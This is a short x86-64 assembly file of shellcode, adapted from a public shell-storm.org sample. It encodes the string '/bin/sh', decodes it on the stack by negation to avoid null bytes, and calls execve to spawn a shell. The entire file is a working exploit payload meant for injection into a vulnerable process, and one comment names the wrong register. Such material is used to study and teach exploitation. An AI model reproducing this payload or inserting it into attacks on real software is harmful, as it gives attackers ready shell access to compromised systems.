# Modeled after http://shell-storm.org/shellcode/files/shellcode-806.php
# (originally by Dad`)
# Modified to be use fewer uncommon instruction sequences (at the expense
# of increasing length from 27 to 30 bytes)
	
.globl _start
_start:
    xor	    %eax, %eax			# set %rax to 0
    movabs  $0xFF978CD091969DD1, %rbx	# load encoded "/bin/sh\0" in %rbx
    neg	    %rbx			# decode by negating
    push    %rbx			# write location to stack
    mov     %rsp, %rdi			# copy string ptr to %rdi (arg 1)
    xor	    %edx, %edx			# set %rdx to 0 (arg 3)
    push    %rdx			# push 0 (terminator) on stack
    push    %rdi			# copy string ptr to stack
    mov	    %rsp, %rsi			# copy array ptr to %rdi (arg 2)
    mov     $0x3b, %al			# load 0x3b (execve) into %rax
    syscall				# execve, doesn't return